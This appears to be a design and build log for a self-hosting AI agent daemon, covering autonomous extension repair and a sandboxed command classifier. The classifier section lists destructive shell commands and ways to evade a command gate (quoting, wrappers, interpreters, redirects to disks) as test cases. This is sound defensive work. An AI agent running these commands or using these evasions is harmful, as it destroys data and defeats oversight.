**`extensions/repair.ts`** (new): `maybeTriggerRepair(trigger, ...)` - bumps
`extensions.consecutive_failures` (`store.recordFailure`), and once it crosses
`REPAIR_THRESHOLD = 2`, checks the circuit breaker (`repair_attempts >= MAX_REPAIR_ATTEMPTS = 3` →
immediately `store.disable()`, never even attempting a 4th repair) before resolving a codegen model
and calling `spawnLearningAgent` wholesale with a differently-worded goal ("this tool is failing:
`<error>`. Re-research if the API/UI changed, then call `extension_write` with a corrected
version") - the exact same learning agent, validation pipeline, and `extension_write`/`promote()`
path Phase 1 already proved, not a parallel implementation. A successful repair's `promote()` call
(inside `extension_write`) already resets both counters to 0, so nothing extra is needed on the
success path here. `reprobeExtensions(...)` is the "useful idle period" trigger from §36: a
fixed-interval (24h, `REPROBE_INTERVAL_MS`) sweep of every enabled extension's no-arg diagnostics,
feeding failures into the exact same `maybeTriggerRepair` path - one counter, two ways to trip it.

**Trigger wiring** (`agent/extension-tools.ts`): every real promoted-tool call is now wrapped in
try/catch - success calls `store.recordSuccess` (resets the failure streak even if a *different*
tool for the same app is what actually failed earlier); failure calls the new `repair` callback
fire-and-forget, then **still rethrows** so the failing call surfaces to the model/user this turn
exactly as before - repair is a background fix for *next* time, never a silent retry of the
current one. `repair` threads through as one more field on `LearnToolContext`
(`agent/learn-tools.ts`) - `app_learn`'s own tool doesn't use it, but `createMiroAgent`
(`agent/index.ts`) builds one shared context and passes it to both `buildExtensionTools` and
`buildLearnTools`, matching the established "shared context, not every consumer needs every field"
pattern.

**`index.ts`**: `resolveCodegenModel`'s Codex-vs-tier logic was factored into a shared
`resolveCodegenSelection(policy)`, reused by both the existing interactive resolver and a new
`resolveCodegenModelAutonomous()` - the autonomous path never interactively asks (matches
`reflect()`'s own "cheapest/no-interaction" precedent for background Dreaming passes; falls back to
whatever `codegen_policy` is already stored, or `"best"` if never set). The module-level `repair()`
function mirrors `reflect()`'s shape exactly: fire-and-forget, logs to the console instead of a
client connection (there is no "current connection" to notify from a background trigger).
`setInterval(reprobeExtensionsPeriodically, REPROBE_INTERVAL_MS)` wires the 24h sweep.

**Live-verification narrative - the full loop proven for real, not simulated:**
1. Real Gotify moved from `:8080` to `:8081`; a small `Bun.serve` shim took `:8080`, transparently
   proxying everything except `/health`, which it 404s - simulating a genuine "upstream renamed/
   removed this endpoint" scenario. `@miro/sdk`'s `createHttpClient` throws on any non-OK
   response, so this is a real, deterministic failure, not a contrived one. Verified the shim's
   both behaviors directly with `curl` before touching the daemon.
2. Two real chat turns ("check gotify's health", "run the health diagnostic") drove the *main*
   chat agent to call the promoted (Phase 1) extension's health-related tools for real - both hit
   the shimmed 404 and threw, exactly as `createHttpClient` promises. `store.recordFailure`
   crossed `REPAIR_THRESHOLD` and `maybeTriggerRepair` fired for real.
3. **Independently observed via the `extensions` table and `mirod.log`, not the model's
   self-report**: `repair_attempts` climbed in real time (`consecutive_failures` separately
   bounced back to 0 whenever an unrelated tool call for the same app succeeded - e.g.
   `get_gotify_info` - exactly the "one counter, reset by any success" design), and `mirod.log`
   showed a long, real stream of `[mirod] repair(gotify) activity` lines - genuine tool-calling
   activity from a real `spawnLearningAgent` run investigating the failure, not a stub.
4. **The repair genuinely fixed it**: the daemon's own `extensions` table moved to
   `{state: "enabled", version: 2, consecutive_failures: 0, repair_attempts: 0, last_error: null}`
   - `promote()` firing for real means `extension_write` was called again, validated, and
   succeeded. The real generated fix (inspected directly on disk,
   `~/.miro/extensions/gotify/{tools.ts,diagnostics.ts}`) is a genuinely sound engineering
   decision, not a hack: since Gotify 3.x's `/health` route no longer exists, both the tool named
   `get_health` and a new `gotify_status` diagnostic were rewritten to call the confirmed-working
   `/version` endpoint instead as a liveness proxy - `get_health`'s own description now says so
   explicitly ("Gotify 3.x exposes this at /version; /health is not a supported route"). The model
   also opportunistically added `get_messages`/`get_applications`/`get_clients` tools while it was
   in there (still read-only GETs, consistent with the read-only-only constraint) - a bit more than
   "just fix the broken thing," but not wrong.
5. **Final independent confirmation**: a fresh chat turn, in a completely separate driver
   connection, asked Miro to check Gotify's health again - it called the newly-repaired
   `gotify_status` tool (visible in the `activity` event: `"Check Gotify status"`) and correctly
   reported success with the real version number, with no error this time.
6. Cleanup verified too: the shim was stopped, Gotify moved back to `:8080`, and both `/version`
   and the real (never-broken) `/health` endpoint were confirmed responding normally again before
   moving on - the repaired extension no longer depends on `/health` at all, so it keeps working
   regardless.

**Stated gap, not silent**: `extensions/repair.ts`'s orchestration (`maybeTriggerRepair`,
`reprobeExtensions`) has no unit-test coverage - it calls `spawnLearningAgent` directly rather than
through an injected/fakeable interface (unlike `operations/engine.ts`'s `OperationKind`, which
`engine.test.ts` fakes freely), so unit-testing the threshold/circuit-breaker logic in isolation
would need a real refactor to make `spawnLearningAgent` injectable. Given this session's live proof
already exercised the real threshold crossing, the real circuit-breaker increment, and the real
promotion path end to end - more rigorously than a fake-context unit test could - this was judged
not worth forcing a refactor for right now. `extensions/store.ts`'s counter mutations themselves
(`recordFailure`/`recordSuccess`/`incrementRepairAttempts`/`disable`/`promote`) are already unit
tested in `store.test.ts`.

Everything else confirmed out of scope this slice, unchanged from the original decisions: OS-level
privilege dropping/seccomp for the extension host, mutating extension tools, a `/extensions`
manual list/enable/disable command, configurable thresholds/intervals, concurrent `app_learn` calls
for the same app.

---

## Part 5 - In progress: Stage D as goal-driven capability acquisition

### 5.1 The redirect that defines this stage

Stage D started, after Stage C slice 2 shipped, as "point self-extension at Jellyfin": golden
hints, adopt an existing instance, read-only tools first. The first live run worked - the learn
agent produced a valid, promoted Jellyfin extension - but it also exposed that the framing was one
level too low. The user's own definition of the feature, which this stage now works from:

> **"Miro autonomously expands its own capabilities in pursuit of a goal: discovering, installing,
> integrating, learning, and operating whatever systems are required, then retaining those
> capabilities for future work."** `learn` is one mechanism underneath it.

Concretely: the user states an **outcome** ("set up media acquisition for my Jellyfin"). Miro
inspects the machine first, infers everything it can, asks only for genuine intent (movies/TV/both,
torrent/Usenet, a VPN credential it cannot obtain), architects the stack itself, prefers software
already installed over its own favourites, installs and configures what is missing, recursively
learns anything unfamiliar (Radarr needs an indexer manager and a download client → branch into
Prowlarr and qBittorrent, finish, resume), hot-loads the tools it generates into the *same running
task*, verifies the whole system end to end (the network architecture, not "the container
started"), and retains everything so that a month later "Download Interstellar" is one tool call.
Learning covers both individual applications and the composed capabilities/workflows that span
them; the result is a durable operational model of the system, not an API cheat sheet.

Two standing constraints from Part 1 shape every decision below: **authority to act stays fully
separate from anything learned about the user** (the per-app maturity ladder gates autonomy; learned
preferences never shortcut it), and **the experienced self-hoster is the first validation
audience** - Miro must be what they reach for over "open Claude Code with root", which means a
visible plan and evidence, no questions it could have answered by inspecting, never replacing a
working stack, verifiable "done", and the ability to steer or override at any point.

### 5.2 The architecture the goal requires

One loop, run by the main agent - **Goal → Inspect → Infer → Ask (intent only) → Architect →
Execute → Verify → Retain** - where Execute recursively *acquires* capability whenever it meets
something unknown. Seven components make the loop real:

| # | Component | Role |
|---|---|---|
| A | **Outcome loop** in the main agent | inspect-first and ask-intent-only disciplines; a visible system plan before anything is touched; an `ask_user` tool so questions no longer require ending the turn |
| B | **Primitives**, hand-written in core | reads as plain tools (`shell_inspect`, `read_file`, `http_get`, `net_capture`); every write as a *generic* operation kind (`shell_command`, `file_write`, `file_delete`, `http_mutation`, `container_apply`) so rollback/verify logic exists once, never in generated code |
| C | **Capability acquisition** = the learn subagent, made recursive | progressive discovery ladder (docs → API probe → config/CLI → packet capture → browser); adaptive control method (REST, CLI, config file, socket - hidden behind outcome-shaped tools like `download_movie`); can call `app_learn` itself, depth-capped; can ask the user; emits a system-model update |
| D | **Hot-load + retry** | newly generated tools usable by the same running agent in the same task; a failed tool triggers an inline repair → hot-load → one retry before the failure surfaces |
| E | **System model** | durable operational graph per capability: software, network, storage/data flow, credential relationships, dependencies, failure behaviour, verification steps |
| F | **Verification** as a phase | architecture tests, not liveness: VPN up/down behaviour, DNS path, exit IP, IPv4/IPv6 leaks, which namespace uses the tunnel, kill-switch/fail-closed |
| G | **Trust gating** | the existing maturity ladder (DISCOVERED→UNDERSTOOD→MANAGED→LEARNED→TRUSTED, §29) decides what auto-approves, per app |

### 5.3 What exists, what is missing

| | Exists (keep) | Gap |
|---|---|---|
| A | 3-line base prompt ("investigate before answering") | no outcome loop, no `ask_user` tool, no system plan |
| B | 13 read-only inventory tools; **one** operation kind (`systemd-restart`); the engine (confirm → capture → apply → verify → commit/rollback, reconcile at boot); `inventory/exec.ts` runs argv arrays, never a shell | no exec, no file write/delete, no generic HTTP, no container mutations, no packet capture |
| C | learn agent (web_search, 8 browser tools, GET-only `http_probe`, `secret_store`, `extension_write`); the full validation pipeline; golden hints | leaf only (cannot recurse); HTTP-only control method; read-only mandate; no user channel; no system-model output |
| D | agent rebuilt on the *next* message when the extension set changes | pi-agent-core supports this natively - `agent.state.tools` is a setter and `AgentToolResult.addedToolNames` marks tools introduced from that transcript point on - so hot-load is a small change, not a re-run hack. Repair is fire-and-forget + rethrow; no retry |
| E | Memory already reserves `app_knowledge`/`extension_knowledge`/`research` categories, "no write path yet" | no structured capability/topology record; no summary section for it |
| F | operation-level `verify()` | no system-level verification phase; no netns/route/DNS primitives |
| G | `autoApprove` per operation plan; `extensions` table | ladder not implemented; extensions carry no maturity state |

### 5.4 Mapping - the smallest clean changes

Untouched: engine core, extension host/SDK/validation/promotion, the repair loop, Memory, inventory
tools, the worker, Codex routing.

- **A.** `BASE_SYSTEM_PROMPT` grows the loop and both disciplines. New `ask_user` tool (main agent)
  on the existing `question`/`secret_prompt` events + `waitForAnswer`. New `system_plan` server
  event: the architecture the user approves once.
- **B.** `operations/kinds/`: `shell-command`, `file-write`, `file-delete`, `http-mutation`,
  `container-apply` - real `OperationKind`s; the model supplies params (including a verify and a
  rollback command where the kind cannot derive them), the engine enforces the phases. Read side:
  `shell_inspect`, `read_file`, `http_get`, `net_capture` (`tcpdump` is already on Debian; `tshark`
  for JSON output).
- **C.** The learn agent gets `app_learn` (recursion, `MAX_LEARN_DEPTH = 3`, an in-progress set to
  break cycles), `ask_user`/`ask_secret`, `shell_inspect`, `read_file`, `net_capture`, and the
  mutation kinds through one `run_operation` tool. Its prompt is rewritten around the discovery
  ladder, "tools are outcomes, hide the mechanism", and "emit a system-model update". Golden hints
  are unchanged.
- **D.** `app_learn`'s execute, after promotion: build the new `ext_*` tools, assign
  `agent.state.tools`, return `addedToolNames`. Needs a late-bound agent reference on
  `LearnToolContext`. `agent/extension-tools.ts`: on failure → inline, narrated, bounded repair →
  hot-load → retry once → then surface.
- **E.** Memory gets a `capability` category: key = capability name, value = a JSON document
  (nodes, edges, data flow, credentials by ref, verify steps). `buildSummary` gains a "Systems you
  operate" section. Both agents write it. ponytail: no graph store until a query the document
  cannot answer actually shows up.
- **F.** Verification = the capability document's `verify` steps run through `shell_inspect`/
  `http_get`, plus deliberate fault injection through engine operations (bring the tunnel down,
  confirm the protected workload cannot reach the internet, bring it back). Primitives + a required
  phase in the loop; no new subsystem.
- **G.** `extensions` gains `maturity`; a new extension's writes always confirm; N successful
  confirmed runs move it up. Learned preferences never touch this column.

### 5.5 Decisions (grilled, 2026-09-01)

1. **Shell boundary: allowlisted read-only `shell_inspect` + engine-wrapped `shell_command`.**
   Rider from the user: *"we need to design a very nice auto classifier similar to how claude code
   does it. i dont want agents randomly deleting stuff or doing really bad stuff. this needs a
   detailed exhaustive design itself."* And: **`rm` is banned outright** - deletion goes through a
   `file_delete` kind that moves to a recoverable trash with retention, so no irrecoverable delete
   primitive exists for any agent. The classifier is its own design (5.7).
2. **Extension writes are declarative bindings to generic kinds**, never generated operation code:
   `operations.ts` returns `{name, kind, params(args), describe(args)}`; the daemon runs it through
   the hand-written kind. Reads stay generated code. Nothing model-authored ever rolls back state.
3. **One approval for the system plan**; routine operations inside it auto-approve per the app's
   maturity; irreversible or network-changing operations still confirm individually.
4. **Sequencing: slice 1 = Jellyfin fresh install through the whole loop** (one app, every
   component exercised once, live-verified); **slice 2 = media acquisition** (recursion,
   composition, VPN/network verification, packet capture when documentation runs out). The golden
   proof is this architecture's acceptance test, not its first slice.

Earlier decisions that still stand: ~~**golden hints, not golden extensions**
(`apps/mirod/golden-hints/<app>.json` - `docsUrl`, `defaultPort`, `authScheme` - read straight from
the repo tree by `extensions/golden-hints.ts`, merged into `runLearnFlow`'s existing `hint`
parameter; a research shortcut, never a substitute for learning)~~ - **SUPERSEDED 2026-09-03 by §5.13
Slice 2:** golden hints deleted entirely; `runLearnFlow` now derives the app's presence from live
discovery (`src/discovery.ts`) instead of a hand-authored file. The **same validation pipeline
for every extension** regardless of provenance; a **Miro-creatable credential is generated, stored
encrypted and reported once, never asked for** (the Jellyfin admin password); the user is asked only
for credentials that genuinely live outside the machine. Superseded: "read-only only" for slice 1.

### 5.6 Removed: the `/learn` slash command

`/learn <app>` and the `learn_request` protocol message are gone (`apps/miro/src/App.tsx`,
`packages/protocol`, `index.ts`). Learning is something the agent decides to do mid-request via
`app_learn`; it is never a command the user has to know about. The first Jellyfin live run used
the slash-command path as a deterministic trigger for verification - that proved the mechanism but
not the intended behaviour, which is a plain chat message causing the agent to learn on its own.
That is the actual acceptance bar from here on.

### 5.7 The command classifier - design draft (pending grilling on the marked forks)

**Goal, in the user's words:** *"make this software very safe to deploy. i dont want accidents if
we can help it. we need to think of workarounds and block those too."* The classifier is the single
gate every agent-issued command passes through - main agent, learn agent, extension write
bindings, repair - in the daemon, before execution, as a pure function with a table-driven test
corpus. Nothing the model says, and nothing generated code contains, can reach a shell without
going through it. It is deliberately Claude Code-shaped: allow/deny/ask rules, compound-command
splitting, prefix matching, a catastrophic denylist - plus Miro's own two additions: **no
irrecoverable delete primitive exists** (deletion is a trash move), and **the operation engine is
the only path for anything that is not read-only**.

#### Classes

Every command resolves to exactly one class; the class decides the execution path.

| Class | Meaning | Path | Examples |
|---|---|---|---|
| `read` | cannot change state (files, services, network, remote systems) | runs directly via `shell_inspect`; output-capped, timed out, never backgrounded | `ip route show`, `docker inspect x`, `cat /etc/fstab`, `dig`, `ss -tlnp`, `systemctl status` |
| `mutate` | changes state, recoverable | engine op (`shell_command`/`file_write`/…): plan shown, confirm unless the app's maturity auto-approves, verify, rollback | `apt install`, `docker run`, `systemctl restart`, `mkdir`, writing a config file |
| `destructive` | destroys data or is hard to reverse | engine op: **always confirm**, snapshot-to-trash first where data is involved, explicit warning | `docker volume rm`, `docker compose down -v`, `git reset --hard`, `apt purge`, SQL `DELETE/DROP/TRUNCATE`, `truncate`, `dd` to a file |
| `lifeline` | can lock the user (or Miro) out, or take the server off the network | engine op: always confirm with a reachability warning; timed auto-revert (apply → prove reachability within N s → else rollback) - the Stage B "lifelines" item, now required by slice 2 | sshd config/`authorized_keys`, firewall (`iptables`/`nft`/`ufw`), `ip link set … down`, `ip route add/del`, netplan/`/etc/network`, `/etc/sudoers`, `/etc/passwd`, `/etc/fstab`, stopping `docker`/`mirod`, anything under `~/.miro/` |
| `forbidden` | Miro never runs it, no override (see fork F1) | refused with the reason and the safe alternative named | `rm` family, `mkfs`/`wipefs`/`fdisk`/`parted`/`dd` to a block device, `shred`, `reboot`/`shutdown`/`halt`/`poweroff` (a dedicated reboot kind exists for that), fork bombs, interactive shells (`sudo -i`, `bash`, `su`), `chmod`/`chown -R` on `/`, `> /dev/sdX`, `crontab -r` |

Unknown command → `mutate`, never `read` (Claude Code's "ask" default). Any parse failure →
`forbidden` for `shell_inspect`, `mutate` for the engine path with the raw string in the plan.

#### Canonicalisation (runs before classification; where most bypasses die)

1. Tokenise with a real POSIX shell-word parser (quotes, escapes) - never regex on the raw string.
   `r'm'`, `"r"m`, `r\m`, `$'rm'` all canonicalise to `rm`.
2. Split on `|`, `||`, `&&`, `;`, `&`, newline. Every segment is classified; the command's class is
   the **maximum** over segments. `&` (backgrounding) is rejected outright in `shell_inspect`.
3. Redirections: `2>/dev/null` and `2>&1` are allowed; any other `>`, `>>`, `>|`, `<>`, `&>` to a
   path is a write → at least `mutate`; a redirect to `/dev/sd*`, `/dev/nvme*`, `/dev/mapper/*`
   is `forbidden`. `tee` is a write.
4. Reject unresolved expansion in `shell_inspect`: `$VAR`, `${…}`, `$(…)`, backticks, `<(…)`,
   `>(…)`, globs in argv[0], `eval`, `exec`, `source`, `.`. The engine path accepts them but the
   whole command is at least `mutate` and shown verbatim in the plan.
5. Resolve argv[0]: strip leading path (`/bin/rm`, `./rm`), `\rm`, `command rm`; unwrap transparent
   wrappers and classify the inner command - `env`, `nice`, `ionice`, `timeout`, `nohup`, `setsid`,
   `time`, `stdbuf`, `sudo`, `doas`, `su -c`, `nsenter`, `chroot`, `docker exec`, `ssh host …`,
   `xargs` (inner = the utility it invokes; `xargs rm` is `rm`), `busybox`/`toybox` (inner = the
   applet). An unknown wrapper is `mutate`.
6. Realpath the binary and compare its basename too, so a symlink named `ls` pointing at `rm`, or
   a PATH shadow, is caught. A binary outside `/usr/bin`, `/usr/sbin`, `/bin`, `/sbin`,
   `/usr/local/bin` is never `read`.

#### Per-binary argument rules (the `read` allowlist is by binary **and** arguments)

`read` is granted only when both the binary and its arguments match a rule. Illustrative entries
(the real table is code + corpus):

- `docker`: `ps`, `inspect`, `logs`, `images`, `network ls/inspect`, `volume ls/inspect`, `stats
  --no-stream`, `exec <c> <read-cmd>` (inner classified) - everything else `mutate`; `rm`,
  `volume rm`, `system prune`, `compose down -v` → `destructive`; `run` with `--privileged`,
  `--pid=host`, `--net=host`, `-v /:…`, `--cap-add` → `destructive`.
- `ip`: `addr/route/link/neigh/rule … show|list|get` → `read`; `add/del/set/flush/change` →
  `lifeline`. Same shape for `nft list` vs `nft add/flush`, `iptables -L/-S` vs anything else.
- `systemctl`: `status/show/cat/list-*/is-*` → `read`; `start/restart/reload/enable` → `mutate`;
  `stop/disable/mask` → `mutate`, or `lifeline` for `ssh`, `docker`, `mirod`, network units.
- `find`: `read` unless `-delete`, `-exec`, `-execdir`, `-ok`, `-fprint*` present → then the inner
  command's class, minimum `mutate`.
- `sed`: `read` only without `-i`; `awk`/`perl` only without `-i`/file writes (`print >`).
- `curl`/`wget`: `read` only for plain GET with no `-X`, `-d`, `--data*`, `-F`, `-T`, `-o`,
  `-O`, `--output`; otherwise `mutate` (remote state or local file). Egress via GET is an accepted,
  logged residual risk - mitigated by never having a secret *value* in any model-visible context.
- `git`: `status/log/diff/show/rev-parse/ls-files` → `read`; `clean`, `reset --hard`, `checkout --
  .`, `push --force` → `destructive`.
- SQL clients (`sqlite3`, `psql -c`, `mysql -e`): `SELECT`/`PRAGMA`/`.schema` → `read`;
  `INSERT/UPDATE` → `mutate`; `DELETE/DROP/TRUNCATE/ALTER` → `destructive`; unparseable →
  `mutate`.
- Package managers: `apt list/show/policy`, `dpkg -l/-L/-s` → `read`; `install` → `mutate`;
  `remove/purge/autoremove`, `upgrade`/`full-upgrade` → `destructive` (availability).
- Plain readers (`cat`, `head`, `tail`, `less`-less, `grep`, `rg`, `jq`, `ls`, `stat`, `file`,
  `df`, `du`, `ps`, `top -bn1`, `ss`, `dig`, `nslookup`, `getent`, `id`, `uname`, `lsblk`, `blkid`,
  `mount` (no args), `journalctl`, `env`) → `read`; `env`/`printenv` and `docker inspect` output
  pass through the secret redactor before the model sees it.

#### Deletion and the trash

`rm`, `rmdir`, `unlink`, `shred`, `find -delete`, `rsync --delete`, `tar --remove-files`, `mv
<path> /dev/null`, `cp /dev/null <path>`, `truncate -s0`, `: > file` are all `forbidden` (or
`destructive` where the primary purpose is something else). Deletion exists only as the
`file_delete` operation kind: `captureState` = move the path into `~/.miro/trash/<ts>/<original
path>` with an index entry (that move *is* the delete; cross-device falls back to copy+remove
inside the kind, the one place the daemon itself may remove); `verify` = path gone; `rollback` =
move back. Directories and files alike. Trash purge is its own confirmed operation with a default
30-day retention. Docker volumes cannot be moved, so `docker volume rm` is `destructive` with
`captureState` = `tar` the volume into the trash first. The same rule generalises: **a destructive
operation on data snapshots to trash before applying** - that is exactly the engine's
`captureState` phase, so this is a policy on kinds, not new machinery.

#### Interpreters and scripts (fork F2) - and what the other harnesses do

Inline code (`python -c`, `perl -e`, `node -e`, `bun -e`, `ruby -e`, `php -r`, `bash -c`, `sh -c`,
`eval`, `awk` programs that write) can hide any deletion, and no classifier can see through it.
Checked against the field (2026-09-01):

- **Claude Code**: literal-prefix allow/deny/ask rules on the raw command string (`Bash(git:*)`
  does not match `/usr/bin/git`), compound splitting on `&&`/`||`/`;`/`|`/newlines with every
  segment matched independently, exec wrappers (`watch`, `setsid`, `ionice`, `flock`) always
  prompt. Inline code is *not* banned - it is just a prefix - and the docs concede the Auto-Mode
  classifier "does not and cannot evaluate what happens several import hops later inside Python's
  runtime." The real containment is **sandbox mode** (Seatbelt / bubblewrap): with
  `autoAllowBashIfSandboxed`, "the sandbox boundary replaces the per-command permission prompt."
- **Codex CLI**: every command runs in a sandbox - Seatbelt on macOS; bubblewrap + Landlock for the
  filesystem and seccomp for network on Linux - deny-by-default with parameterised writable roots,
  network off unless enabled; policies `read-only` / `workspace-write` / `danger-full-access`. No
  inline-code classification at all: the sandbox *is* the boundary.
- **OpenCode**: allow/ask/deny glob patterns on commands, deny overrides allow, per-agent
  overrides, `"*": "ask"` default; filesystem path boundaries being added; no OS sandbox.

The lesson is the same one Miro already applies to secrets: **contain, don't classify.** Banning
`-c` is circumvented by writing the same code to a file, which the ban itself would allow. So the
revised proposal is:

1. Inline code is `mutate` - engine path, plan shown, confirm unless maturity auto-approves.
2. **Every non-`read` command executes inside a kernel sandbox** (bubblewrap for the filesystem
   view + Landlock as the second lock; seccomp/`--unshare-net` for network) whose writable roots
   are exactly the paths the operation's plan declared and whose network is on only if the plan
   said so. A write outside the declared scope fails with `EACCES`, the operation fails its
   `verify`, and the engine rolls back. *An operation cannot touch what its plan did not say it
   would touch* - that is the "no accidents" property, enforced by the kernel, not by a regex.
3. `shell_inspect` (`read`) runs sandboxed too - read-only root, no network unless the rule for
   that binary needs it (`dig`, `curl` GET) - so the allowlist is routing and UX; the kernel is
   enforcement.
4. Scripts-to-disk stays the *prompted* pattern for anything non-trivial (the full content is in
   the plan the user sees and can diff), not a hard ban; the static scan for deletion/format APIs
   still bumps a script to `destructive`.

Feasibility, checked on the dev VM: Debian 13 ships kernel 6.12 with `CONFIG_SECURITY_LANDLOCK=y`
and Landlock in the LSM list, unprivileged user namespaces are enabled, `bubblewrap` 0.12 is one
`apt install` away, and mirod currently runs as the unprivileged `miro` user.

**Honest limits.** The sandbox cannot see past a socket: `docker run -v /:/host …`, `systemctl`,
anything over D-Bus, and `apt` (which writes as root through `dpkg`) do their damage in another
process. Those stay governed by the classifier's per-binary argument rules (`--privileged`,
`-v /:`, `volume rm`, `stop ssh` …), which is why the two layers are complementary, not
redundant. Privilege is the other open edge: bubblewrap cannot grant root, so operations that
need it (`apt install`, `systemctl`, the docker socket) require mirod to run as root - Landlock
and bind-mounted writable roots constrain root exactly as they constrain a user - or to run those
specific commands through `sudo` outside the sandbox with the classifier as the only gate.
Running the daemon as root (the `curl | sudo sh` install path already implies a system service)
is the inferred default; it is flagged here rather than silently assumed.

#### Sudo and identity

`sudo`, `doas`, `su -c` are transparent wrappers: the inner command's class applies. `sudo -i`,
`sudo su`, `sudo bash`, `su` (interactive) are `forbidden`. How mirod itself runs (root vs a
service user with scoped sudo) is a deployment decision outside this design; the classifier is
identical either way.

#### User-granted rules (explicit authority, never inferred)

Stored, inspectable allow/deny/ask rules with prefix or glob matching on the canonical argv
(`allow: docker compose up -d *`, `deny: apt upgrade`), edited through a slash command and
offered after a confirmation the way Claude Code offers "always allow" - **only for `mutate`**;
`destructive` and `lifeline` never get a standing allow, `forbidden` has no rule at all. This is
the one place user *choice* widens autonomy; the maturity ladder is the other, per app. Neither is
ever written by Dreaming or inferred from approval history - the Part 1 principle.

#### Resource and self-protection

`shell_inspect`: hard timeout, output cap, no backgrounding, no `&`. Fork bombs and `cat
/dev/zero`-style patterns are `forbidden`. Anything touching `~/.miro/` (DB, `secret.key`,
extensions, trash) is `lifeline`; `secret.key` and the DB are never deleted through any path.
Secret values are substituted by reference at execution time and redacted from every log line and
every model-visible output.

#### Bypass catalogue (each entry is a test case)

Quoting and escapes (`r'm'`, `"r"m`, `r\m`, `$'rm'`); paths and aliases (`/bin/rm`, `./rm`,
`\rm`, `command rm`, `busybox rm`, symlink named `ls`); wrappers (`env rm`, `nice rm`, `timeout 5
rm`, `xargs rm`, `sudo rm`, `nsenter … rm`, `docker exec c rm`, `docker run -v /:/h alpine rm -rf
/h`, `ssh localhost rm`); interpreters (`python -c "os.remove"`, `perl -e unlink`, `bash -c "rm"`);
find/rsync/tar flags (`find -delete`, `-exec rm`, `rsync --delete`, `--remove-files`); redirects
(`> file`, `: > file`, `cat /dev/null > file`, `> /dev/sda`); moves (`mv x /dev/null`, `mv / /tmp`);
compound (`ls; rm x`, `ls && rm x`, `ls | xargs rm`); expansion (`$RM x`, `$(echo rm) x`,
`` `which rm` x ``); data destruction by other names (`truncate -s0`, `dd if=/dev/zero of=file`,
`shred`, `docker volume rm`, `compose down -v`, `git clean -fdx`, `sqlite3 db "DELETE"`);
lockout (`ufw enable` with no ssh rule, `iptables -F`, editing `sshd_config`/`authorized_keys`,
`systemctl stop ssh`, `ip link set eth0 down`, `passwd -l`); self-harm (`systemctl stop mirod`,
`kill <mirod pid>`, `rm ~/.miro/secret.key`); availability (`apt full-upgrade`, `docker system
prune -a --volumes`, `reboot`). The corpus asserts the class for every one, and the classifier is
not done until every entry has a test.

#### Forks - resolved and open

- **F1 - `forbidden` is never overridable.** Settled. Miro never needs `rm`; trash covers it, and
  the user's own shell is one keystroke away for the rest. No "I know what I'm doing" path exists,
  so nothing an injected prompt or a bad generation can say unlocks it.
- **F2 - contain, don't classify.** Settled. Inline interpreter code is `mutate`; every non-`read`
  command runs inside a kernel sandbox with the plan's declared writable roots and network flag
  (bubblewrap first - a CLI, usable today; Landlock as the second lock once a tiny helper exists -
  `ponytail:` one layer now, two when the helper is written). Scripts-to-disk is the prompted
  pattern, not a ban.
- **Privilege model - mirod runs as root, every command under the sandbox.** Settled. The
  `curl | sudo sh` install already makes it a system service; Landlock and bind-mounted writable
  roots constrain root exactly as they constrain a user, so plan-declared scope holds. One code
  path. The dev VM must match: mirod runs as root there too from here on.
- **F3 - lifeline auto-revert ships in slice 1**, before any `lifeline`-class operation can run.
  Settled: safe-to-deploy means no window in which Miro can lock the user out.

### 5.8 Build progress (slice 1)

Order: classifier → sandbox → trash/snapshot/generic kinds → lifelines → read tools → `ask_user` +
system plan → learn agent (recursion, bindings, capability memory) → hot-load + retry → maturity →
main-agent loop → live proof. Each step tested; each OS-touching step live-verified on the VM.

- **Step 1, classifier - done.** `operations/classify.ts` (tokeniser, compound split, redirect and
  expansion handling, wrapper unwrapping, argv[0] realpath, per-binary argument rules, five
  classes) with `classify.test.ts` as the executable bypass catalogue: 22 tests / 334 assertions,
  every entry from §5.7. Corpus caught six real gaps on the first run (`mkfs.ext4` by prefix,
  `truncate -s0` attached value, `rmSync` via `require("fs")`, `kill -0`, digit-bearing flag
  clusters like `top -bn1`, `ip -n <ns> route`) and one tokeniser hole (`<(…)` process
  substitution grabbed as a redirect) - all fixed, all now asserted.
- **Step 2, sandbox - done, proven live.** `operations/sandbox.ts` wraps bubblewrap: read-only
  root, plan-declared roots bind-mounted writable, `--unshare-net` unless declared, scrubbed env,
  timeout, output cap. The exact invocation was probed on the VM *before* the code existed and the
  test file (`sandbox.test.ts`, real subprocesses) passes 13/13 as `miro` and as root: in-scope
  write OK, `/etc` and `$HOME` refused with EROFS and no file left behind, loopback unreachable with
  network off, reachable with it on, docker socket passes through when bound. `bubblewrap` and
  `tshark` are in cloud-init now.
- **Step 3, trash + snapshot + generic kinds - done, proven live.** `trash.ts` (deterministic
  destination, EXDEV copy-then-remove as the daemon's one removal, append-only index),
  `snapshot.ts` (tar of declared roots, 64MB cap, portable size walk), `OperationPlan` gains
  `class`/`writes`/`network`/`irreversible`/`warning` with `effectiveAutoApprove()` forcing
  confirmation for `destructive`/`lifeline`/`irreversible` regardless of the kind, and four kinds:
  `shell.command` (classify → refuse forbidden, snapshot roots, apply under the sandbox, verify
  with the roots visible read-only, rollback = restore + undo command), `file.write` (current and
  proposed content in the plan, rollback restores or trashes), `file.delete` (the trash move is the
  apply; destination carried in captured state so crash reconciliation needs nothing else),
  `http.mutation` (local/private URLs only, credentials by secret reference only - a literal
  `Authorization` header is refused - GET-before/after, PUT rollback). Tools: `shell_command`
  (read-class commands run immediately in a read-only sandbox), `file_write`, `file_delete`,
  `http_mutation`. VM result: 80/80 operations tests as `miro` and as root, including the
  end-to-end shell case (failed verify restores the snapshot; an undeclared write outside the
  scope is refused; an undeclared write under `/tmp` lands in the sandbox's throwaway tmpfs and
  never reaches the host - documented, deliberate).

- **Step 4, lifelines - done.** `runOperation` gates every `lifeline`-class commit on a
  reachability confirmation: after apply + verify it asks "still connected?" over the very path
  the change could have broken and rolls back on its own if no answer arrives within
  `LIFELINE_CONFIRM_MS` (90s) or the user says roll back. Engine tests cover confirm, timeout
  (injectable window), and explicit rollback. `systemd.restart` now declares `class: "lifeline"`
  for SSH/network units instead of its old "force ask because lifelines aren't built" hack.
- **Step 5, read tools - done, proven live.** `agent/read-tools.ts`: `shell_inspect` (classify →
  `read` only → read-only filesystem sandbox), `read_file` (secret-path guard, size cap, binary
  detection), `http_get` (local/private URLs, credentials by secret reference), `net_capture`
  (`tshark -T fields`, summary or decoded-HTTP mode, credential-shaped payloads masked, 60s cap,
  sudo fallback when unprivileged). Live on the VM: `ip route show` returns the real table,
